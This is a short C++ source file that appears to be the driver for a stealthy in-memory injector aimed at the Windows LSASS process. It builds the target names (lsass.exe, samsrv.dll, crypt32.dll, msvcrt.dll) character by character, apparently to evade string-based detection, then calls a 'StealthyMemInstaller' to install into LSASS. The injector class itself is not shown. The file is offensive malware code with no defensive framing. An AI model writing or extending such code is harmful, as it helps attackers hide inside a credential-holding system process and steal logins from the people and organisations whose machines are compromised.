#include "Installer.h"
#include <iostream>

using namespace std;

void Installer::Init() {
    wstring we = L"";
    samsrvDll = we+L's'+L'a'+L'm'+L's'+L'r'+L'v'+L'.'+L'd'+L'l'+L'l';
    msvcrtDll = we+L'm'+L's'+L'v'+L'c'+L'r'+L't'+L'.'+L'd'+L'l'+L'l';
    crypt32Dll = we+L'c'+L'r'+L'y'+L'p'+L't'+L'3'+L'2'+L'.'+L'd'+L'l'+L'l';
    lsassExe = we+L'l'+L's'+L'a'+L's'+L's'+L'.'+L'e'+L'x'+L'e';
}

int main() {
    Installer inst;
    inst.Init();

    StealthyMemInstaller smi;
    vector<wstring> preferedThreadModuleNames;
    preferedThreadModuleNames.push_back(inst.samsrvDll);
    preferedThreadModuleNames.push_back(inst.msvcrtDll);
    preferedThreadModuleNames.push_back(inst.crypt32Dll);
    smi.Init(preferedThreadModuleNames, inst.lsassExe);

    if (!smi.Install()) {
        cout << "Install failed" << endl;
    } else {
        cout << "Install success" << endl;
    }
}